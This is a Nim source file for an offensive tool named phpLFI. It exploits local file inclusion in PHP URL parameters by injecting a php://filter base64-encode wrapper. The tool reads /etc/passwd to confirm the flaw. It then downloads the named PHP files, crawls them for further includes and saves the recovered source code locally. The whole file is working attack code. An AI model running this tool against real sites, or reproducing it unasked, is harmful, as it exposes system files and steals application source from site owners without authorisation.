import std/base64
import std/httpclient
import std/re
import std/sequtils
import std/parseopt
import strutils
import strformat

var p = initOptParser()
let usage = """Author:   Steve Campbell  - @lpha3ch0
Purpose:  Test for LFI in PHP params and download the source code of vulnerable PHP apps.
Usage:    phpLFI[.exe] -u:URL -f:file1.php,file2.php"""

proc parse_args: (bool, string, string, bool) =
  var help: bool = false
  var url: string = ""
  var files: string = ""
  var test: bool = false
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      if p.key == "h" or p.key == "help":
        help = true
      if p.key == "u" or p.key == "url":
        url = p.val
      if p.key == "f" or p.key == "files":
        files = p.val
      if p.key == "t" or p.key == "test":
        test = true
    of cmdArgument:
      continue #argument = p.key
  return (help, url, files, test)

proc testForLFI(url: string): bool =
  var client = newHTTPClient()
  let phpfilter = "php://filter/convert.base64-encode/resource="
  let testUrl = split(url, '=')[0]
  try:
    var plaintext = client.getContent(testUrl & "=" & phpfilter & "/etc/passwd").decode
    if "root:" in plaintext:
      echo "\n[!] LFI found in url. Successfully accessed /etc/passwd\n"
      echo plaintext
      return true
    else:
      return false
  except:
    var error = getCurrentException() 
    echo error.msg
  

proc downloadFiles(url: string, files: string): void =
  echo "\n[i] Searching php files for includes...\n"
  var client = newHTTPClient()
  let testUrl = split(url, '=')[0]
  let phpfilter = "=php://filter/convert.base64-encode/resource="
  var filesSeq = newSeq[string]()
  filesSeq = files.split(",")
  var foundfiles = newSeq[string]()
  let regx = re"(\w+).php"
  for file in filesSeq:
    try:
      var plaintext = client.getContent(testUrl & phpfilter & file).decode
      let found = findAll(plaintext, regx)
      for file in found:
        foundfiles.add(file)
        echo "Discovered a file: ", file
    except:
      break
  
  var allfiles = deduplicate(concat(filesSeq,foundfiles))

  for file in allfiles:
    var url: string = testUrl & phpfilter & file
    echo "Checking file: ", file
    try:
      var plaintext = client.getContent(url).decode
      writeFile(file, plaintext)
      echo &"    Saving file: {file}"
    except:
      var error = getCurrentException() 
      echo error.msg
      break


proc main(): void =
  let (help, url, files, test) = parse_args()
  if help == true:
    echo usage
    quit(1)
  if url == "":
    echo usage
    quit(-1)
  if files == "":
    if test == false:
      echo usage
      quit(-1)
  if not testForLFI(url):
    echo "LFI not found in url"
    quit(-1)
  downloadFiles(url, files)
    

when isMainModule:
    main()
